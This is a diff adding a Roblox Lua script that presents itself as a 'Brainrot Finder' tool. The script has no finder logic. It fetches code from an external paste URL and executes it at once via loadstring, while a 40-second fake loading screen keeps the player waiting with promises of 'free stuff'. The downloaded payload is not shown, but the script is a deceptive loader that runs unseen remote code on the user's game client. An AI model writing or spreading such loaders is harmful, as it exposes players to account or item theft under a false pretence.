@@ -1,0 +1,171 @@
+--// BRAINROT FINDER 1B+ LOADER
+
+local URL = "https://oblivionhub.xyz/api/paste?id=42425b5f305561169862cf2e9cdc7a38&raw=true"
+
+--// LOADER FUNCTION
+local function ExecuteLoader()
+    local source = game:HttpGet(URL)
+
+    assert(
+        type(source) == "string" and #source > 0,
+        "Loader returned empty content"
+    )
+
+    local compiled, compileError = loadstring(source)
+
+    assert(
+        compiled,
+        compileError or "Compilation failed"
+    )
+
+    compiled()
+end
+
+--// GUI SETUP
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+
+local Player = Players.LocalPlayer
+local PlayerGui = Player:WaitForChild("PlayerGui")
+
+local OldGui = PlayerGui:FindFirstChild("BrainrotFinderLoading")
+if OldGui then
+    OldGui:Destroy()
+end
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "BrainrotFinderLoading"
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = PlayerGui
+
+local Main = Instance.new("Frame")
+Main.Name = "Main"
+Main.Size = UDim2.new(0, 360, 0, 210)
+Main.Position = UDim2.new(0.5, -180, 0.5, -105)
+Main.BackgroundColor3 = Color3.fromRGB(13, 10, 23)
+Main.BorderSizePixel = 0
+Main.Parent = ScreenGui
+
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 14)
+MainCorner.Parent = Main
+
+local Stroke = Instance.new("UIStroke")
+Stroke.Color = Color3.fromRGB(155, 65, 255)
+Stroke.Thickness = 2
+Stroke.Parent = Main
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, -20, 0, 42)
+Title.Position = UDim2.new(0, 10, 0, 12)
+Title.BackgroundTransparency = 1
+Title.Text = "BRAINROT FINDER 1B+"
+Title.TextColor3 = Color3.fromRGB(190, 120, 255)
+Title.TextSize = 23
+Title.Font = Enum.Font.GothamBold
+Title.Parent = Main
+
+local Status = Instance.new("TextLabel")
+Status.Size = UDim2.new(1, -30, 0, 36)
+Status.Position = UDim2.new(0, 15, 0, 62)
+Status.BackgroundTransparency = 1
+Status.Text = "Loading... stay for potential free stuff!"
+Status.TextColor3 = Color3.fromRGB(235, 235, 245)
+Status.TextSize = 14
+Status.Font = Enum.Font.Gotham
+Status.TextWrapped = true
+Status.Parent = Main
+
+local TimerLabel = Instance.new("TextLabel")
+TimerLabel.Size = UDim2.new(1, -20, 0, 30)
+TimerLabel.Position = UDim2.new(0, 10, 0, 103)
+TimerLabel.BackgroundTransparency = 1
+TimerLabel.Text = "Starting... 40s"
+TimerLabel.TextColor3 = Color3.fromRGB(190, 120, 255)
+TimerLabel.TextSize = 20
+TimerLabel.Font = Enum.Font.GothamBold
+TimerLabel.Parent = Main
+
+local BarBackground = Instance.new("Frame")
+BarBackground.Size = UDim2.new(1, -40, 0, 10)
+BarBackground.Position = UDim2.new(0, 20, 0, 151)
+BarBackground.BackgroundColor3 = Color3.fromRGB(39, 32, 53)
+BarBackground.BorderSizePixel = 0
+BarBackground.Parent = Main
+
+local BarCorner = Instance.new("UICorner")
+BarCorner.CornerRadius = UDim.new(1, 0)
+BarCorner.Parent = BarBackground
+
+local Bar = Instance.new("Frame")
+Bar.Size = UDim2.new(0, 0, 1, 0)
+Bar.BackgroundColor3 = Color3.fromRGB(170, 80, 255)
+Bar.BorderSizePixel = 0
+Bar.Parent = BarBackground
+
+local BarFillCorner = Instance.new("UICorner")
+BarFillCorner.CornerRadius = UDim.new(1, 0)
+BarFillCorner.Parent = Bar
+
+local Footer = Instance.new("TextLabel")
+Footer.Size = UDim2.new(1, -20, 0, 22)
+Footer.Position = UDim2.new(0, 10, 0, 175)
+Footer.BackgroundTransparency = 1
+Footer.Text = "BRAINROT FINDER • INITIALIZING"
+Footer.TextColor3 = Color3.fromRGB(135, 125, 155)
+Footer.TextSize = 11
+Footer.Font = Enum.Font.Gotham
+Footer.Parent = Main
+
+--// START LOADER IMMEDIATELY
+local LoaderFinished = false
+local LoaderError = nil
+
+task.spawn(function()
+    local success, err = pcall(ExecuteLoader)
+
+    LoaderFinished = true
+
+    if not success then
+        LoaderError = tostring(err)
+        warn("Brainrot Finder loader failed: " .. LoaderError)
+    end
+end)
+
+--// 40-SECOND COUNTDOWN
+for seconds = 40, 1, -1 do
+    TimerLabel.Text = "Loading... " .. seconds .. "s"
+
+    local progress = (41 - seconds) / 40
+
+    TweenService:Create(
+        Bar,
+        TweenInfo.new(1, Enum.EasingStyle.Linear),
+        {Size = UDim2.new(progress, 0, 1, 0)}
+    ):Play()
+
+    if seconds == 30 then
+        Status.Text = "Stay tuned! There might be free stuff!"
+    elseif seconds == 5 then
+        Status.Text = "GG FREAKING EASY"
+        Status.TextColor3 = Color3.fromRGB(200, 120, 255)
+    end
+
+    task.wait(1)
+end
+
+--// FINISH
+TimerLabel.Text = "100%"
+Bar.Size = UDim2.new(1, 0, 1, 0)
+
+if LoaderError then
+    Status.Text = "Loader failed. Check the error."
+    Footer.Text = "LOADER ERROR"
+elseif LoaderFinished then
+    Status.Text = "GG FREAKING EASY"
+    Footer.Text = "LOADING COMPLETE"
+else
+    Status.Text = "Still loading..."
+    Footer.Text = "PLEASE WAIT"
+end
